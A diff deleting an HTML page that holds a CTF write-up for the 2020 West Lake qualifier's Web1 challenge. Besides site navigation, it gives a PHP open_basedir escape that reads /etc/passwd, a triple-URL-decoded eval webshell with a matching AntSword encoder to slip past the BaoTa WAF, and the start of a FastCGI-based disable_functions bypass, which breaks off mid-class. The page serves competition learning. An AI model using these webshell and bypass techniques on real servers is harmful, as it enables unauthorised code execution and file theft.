@@ -1,1008 +1,198 @@
-
-
-
-<!doctype html>
-<html lang="en" class="no-js">
-  <head>
-    
-      <meta charset="utf-8">
-      <meta name="viewport" content="width=device-width,initial-scale=1">
-      
-      
-        <link rel="canonical" href="https://github.com/eggdkk/Web_Learning/CTF_Writeup/2020xhlj/">
-      
-      
-        <meta name="author" content="dkk">
-      
-      <link rel="shortcut icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.4.0">
-    
-    
-      
-        <title>2020西湖论剑初赛 - Web learning</title>
-      
-    
-    
-      <link rel="stylesheet" href="../../assets/stylesheets/main.fe0cca5b.min.css">
-      
-      
-    
-    
-    
-      
-        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
-        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
-      
-    
-    
-    
-      <link rel="stylesheet" href="../../css/extension.css">
-    
-      <link rel="stylesheet" href="../../css/simpleLightbox.scss">
-    
-    
-      
-    
-    
-  </head>
-  
-  
-    <body dir="ltr">
-  
-    
-    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
-    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
-    <label class="md-overlay" for="__drawer"></label>
-    <div data-md-component="skip">
-      
-        
-        <a href="#2020" class="md-skip">
-          Skip to content
-        </a>
-      
-    </div>
-    <div data-md-component="announce">
-      
-    </div>
-    
-      <header class="md-header" data-md-component="header">
-  <nav class="md-header-nav md-grid" aria-label="Header">
-    <a href="https://github.com/eggdkk/Web_Learning" title="Web learning" class="md-header-nav__button md-logo" aria-label="Web learning">
-      
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
-
-    </a>
-    <label class="md-header-nav__button md-icon" for="__drawer">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
-    </label>
-    <div class="md-header-nav__title" data-md-component="header-title">
-      
-        <div class="md-header-nav__ellipsis">
-          <span class="md-header-nav__topic md-ellipsis">
-            Web learning
-          </span>
-          <span class="md-header-nav__topic md-ellipsis">
-            
-              2020西湖论剑初赛
-            
-          </span>
-        </div>
-      
-    </div>
-    
-      <label class="md-header-nav__button md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
-      </label>
-      
-<div class="md-search" data-md-component="search" role="dialog">
-  <label class="md-search__overlay" for="__search"></label>
-  <div class="md-search__inner" role="search">
-    <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
-      <label class="md-search__icon md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </label>
-      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
-      </button>
-    </form>
-    <div class="md-search__output">
-      <div class="md-search__scrollwrap" data-md-scrollfix>
-        <div class="md-search-result" data-md-component="search-result">
-          <div class="md-search-result__meta">
-            Initializing search
-          </div>
-          <ol class="md-search-result__list"></ol>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-    
-      <div class="md-header-nav__source">
-        
-<a href="https://github.com/eggdkk/Web_Learning/" title="Go to repository" class="md-source">
-  <div class="md-source__icon md-icon">
-    
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
-  </div>
-  <div class="md-source__repository">
-    eggdkk/Web_Learning
-  </div>
-</a>
-      </div>
-    
-  </nav>
-</header>
-    
-    <div class="md-container" data-md-component="container">
-      
-        
-      
-      
-        
-      
-      <main class="md-main" data-md-component="main">
-        <div class="md-main__inner md-grid">
-          
-            
-              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
-  <label class="md-nav__title" for="__drawer">
-    <a href="https://github.com/eggdkk/Web_Learning" title="Web learning" class="md-nav__button md-logo" aria-label="Web learning">
-      
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
-
-    </a>
-    Web learning
-  </label>
-  
-    <div class="md-nav__source">
-      
-<a href="https://github.com/eggdkk/Web_Learning/" title="Go to repository" class="md-source">
-  <div class="md-source__icon md-icon">
-    
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
-  </div>
-  <div class="md-source__repository">
-    eggdkk/Web_Learning
-  </div>
-</a>
-    </div>
-  
-  <ul class="md-nav__list" data-md-scrollfix>
-    
-      
-      
-      
-
-
-  <li class="md-nav__item">
-    <a href="../.." title="index" class="md-nav__link">
-      index
-    </a>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
-    
-    <label class="md-nav__link" for="nav-2">
-      Web基础嗷
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="Web基础嗷" data-md-level="1">
-      <label class="md-nav__title" for="nav-2">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        Web基础嗷
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/Overview/" title="Web概述" class="md-nav__link">
-      Web概述
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/Server%26Middleware/" title="服务器&中间件" class="md-nav__link">
-      服务器&中间件
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/BasisDatabaseSyntax/" title="数据库基础&tcpdump抓包" class="md-nav__link">
-      数据库基础&tcpdump抓包
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/include/" title="文件包含" class="md-nav__link">
-      文件包含
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/PhpTricks/" title="PHP的一些 “特性”" class="md-nav__link">
-      PHP的一些 “特性”
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/NoColumnInjection/" title="SQL注入限制条件下获取表名&无列名注入" class="md-nav__link">
-      SQL注入限制条件下获取表名&无列名注入
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/PhpUnserialization/" title="PHP反序列化" class="md-nav__link">
-      PHP反序列化
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/Redis/" title="Redis" class="md-nav__link">
-      Redis
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
-    
-    <label class="md-nav__link" for="nav-3">
-      👴平常记录的
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="👴平常记录的" data-md-level="1">
-      <label class="md-nav__title" for="nav-3">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        👴平常记录的
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/docker%2BPHPdebug/" title="docker+PHPdebug" class="md-nav__link">
-      docker+PHPdebug
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/oh_my_zsh/" title="oh_my_zsh配置" class="md-nav__link">
-      oh_my_zsh配置
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/" title="Test" class="md-nav__link">
-      Test
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/email/" title="邮箱收集渗透钓鱼" class="md-nav__link">
-      邮箱收集渗透钓鱼
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/golang_dockerAPI/" title="golang_dockerAPI开发小记" class="md-nav__link">
-      golang_dockerAPI开发小记
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/ew/" title="ssh隧道_ew穿透" class="md-nav__link">
-      ssh隧道_ew穿透
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-  
-
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
-    
-    <label class="md-nav__link" for="nav-4">
-      CTF_Writeup
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="CTF_Writeup" data-md-level="1">
-      <label class="md-nav__title" for="nav-4">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        CTF_Writeup
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-  
-
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        2020西湖论剑初赛
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
-        </span>
-      </label>
-    
-    <a href="./" title="2020西湖论剑初赛" class="md-nav__link md-nav__link--active">
-      2020西湖论剑初赛
-    </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#web1" class="md-nav__link">
-    Web1
-  </a>
-  
-    <nav class="md-nav" aria-label="Web1">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#disable_functions" class="md-nav__link">
-    绕过disable_functions解法一
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#disable_functions_1" class="md-nav__link">
-    绕过disable_functions解法二
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#lua" class="md-nav__link">
-    利用lua
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web5" class="md-nav__link">
-    Web5
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020N1CTF/" title="2020N1CTF" class="md-nav__link">
-      2020N1CTF
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020_zer0pts_CTF/" title="2020_zer0pts_CTF" class="md-nav__link">
-      2020_zer0pts_CTF
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020_Hackergame/" title="Hackergame 2020" class="md-nav__link">
-      Hackergame 2020
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020UNCTF_Web/" title="2020UNCTF_Web" class="md-nav__link">
-      2020UNCTF_Web
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020dhb_Web/" title="2020dhb_Web" class="md-nav__link">
-      2020dhb_Web
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020xyb/" title="2020祥云杯" class="md-nav__link">
-      2020祥云杯
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020HuaweiCTF/" title="2020华为云CTF" class="md-nav__link">
-      2020华为云CTF
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020Huawei2/" title="2020华为云CTF第二场" class="md-nav__link">
-      2020华为云CTF第二场
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
-    
-    <label class="md-nav__link" for="nav-5">
-      vulhub靶场
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="vulhub靶场" data-md-level="1">
-      <label class="md-nav__title" for="nav-5">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        vulhub靶场
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../vulhub/narak/" title="narak" class="md-nav__link">
-      narak
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item">
-    <a href="../../friendly_link/" title="友链~" class="md-nav__link">
-      友链~
-    </a>
-  </li>
-
-    
-  </ul>
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-            
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#web1" class="md-nav__link">
-    Web1
-  </a>
-  
-    <nav class="md-nav" aria-label="Web1">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#disable_functions" class="md-nav__link">
-    绕过disable_functions解法一
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#disable_functions_1" class="md-nav__link">
-    绕过disable_functions解法二
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#lua" class="md-nav__link">
-    利用lua
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web5" class="md-nav__link">
-    Web5
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-          
-          <div class="md-content">
-            <article class="md-content__inner md-typeset">
-              
-                
-                  <a href="https://github.com/eggdkk/Web_Learning/edit/master/docs/CTF_Writeup/2020xhlj.md" title="Edit this page" class="md-content__button md-icon">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
-                  </a>
-                
-                
-                  
-                
-                
-                <h1 id="2020">2020西湖论剑<a class="headerlink" href="#2020" title="Permanent link">&para;</a></h1>
-<h2 id="web1">Web1<a class="headerlink" href="#web1" title="Permanent link">&para;</a></h2>
-<p>利用<code>%0a</code>来绕过文件名waf
-<img alt="" src="../../image/CTF_Writeup/2020xhlj/1.png" /><br />
-发现有<code>disable_functions</code>和<code>open_basedir</code> <br />
-可以利用
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">mkdir</span><span class="p">(</span><span class="s1">&#39;dkkkkkkkk&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;dkkkkkkkk&#39;</span><span class="p">);</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
-<span class="nb">print_r</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">));</span>
-<span class="nb">highlight_file</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">)</span>
-<span class="cp">?&gt;</span><span class="x"></span>
-</code></pre></div>
-绕过<code>open_basedir</code></p>
-<h3 id="disable_functions">绕过<code>disable_functions</code>解法一<a class="headerlink" href="#disable_functions" title="Permanent link">&para;</a></h3>
-<p>利用蚁剑插件，直接绕过，靶机有宝塔，不能传入动态执行参数</p>
-<p>ha1师傅完了和我说可以利用URL编码3次。宝塔就不会拦截</p>
-<p>WebShell
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">eval</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dkk&#39;</span><span class="p">]))));</span><span class="cp">?&gt;</span><span class="x"></span>
-</code></pre></div></p>
-<p>蚁剑新建编码器；
-<div class="highlight"><pre><span></span><code><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
-<span class="kd">function</span> <span class="nx">forceEncode</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
-  <span class="k">return</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">s</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">i</span><span class="p">=&gt;</span><span class="s1">&#39;%&#39;</span><span class="o">+</span><span class="nx">i</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mf">0</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-<span class="p">}</span>
-<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">(</span><span class="nx">pwd</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">ext</span><span class="o">=</span><span class="p">{})</span> <span class="p">=&gt;</span> <span class="p">{</span>
-  <span class="kr">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">]</span>
-  <span class="nx">data</span><span class="p">[</span><span class="nx">pwd</span><span class="p">]</span> <span class="o">=</span> <span class="nx">forceEncode</span><span class="p">(</span><span class="nx">forceEncode</span><span class="p">(</span><span class="nx">forceEncode</span><span class="p">(</span><span class="nx">payload</span><span class="p">)));</span>
-  <span class="k">delete</span> <span class="nx">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
-  <span class="k">return</span> <span class="nx">data</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div>
-<img alt="" src="../../image/CTF_Writeup/2020xhlj/2.png" /></p>
-<p>利用插件不多说</p>
-<h3 id="disable_functions_1">绕过<code>disable_functions</code>解法二<a class="headerlink" href="#disable_functions_1" title="Permanent link">&para;</a></h3>
-<p>当时不知道绕过bt，于是就手动上传<code>.so</code> php文件
-<a href="https://github.com/AntSwordProject/ant_php_extension">https://github.com/AntSwordProject/ant_php_extension</a></p>
-<p><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
-<span class="k">class</span> <span class="nc">Client</span>
-<span class="p">{</span>
-    <span class="k">const</span> <span class="no">VERSION_1</span>            <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">BEGIN_REQUEST</span>        <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">PARAMS</span>               <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">STDIN</span>                <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">STDOUT</span>               <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">STDERR</span>               <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">DATA</span>                 <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">GET_VALUES</span>           <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">GET_VALUES_RESULT</span>    <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">UNKNOWN_TYPE</span>         <span class="o">=</span> <span class="mi">11</span><span class="p">;</span>
-    <span class="k">const</span> <span class="no">RESPONDER</span>            <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="k">protected</span> <span class="nv">$keepAlive</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
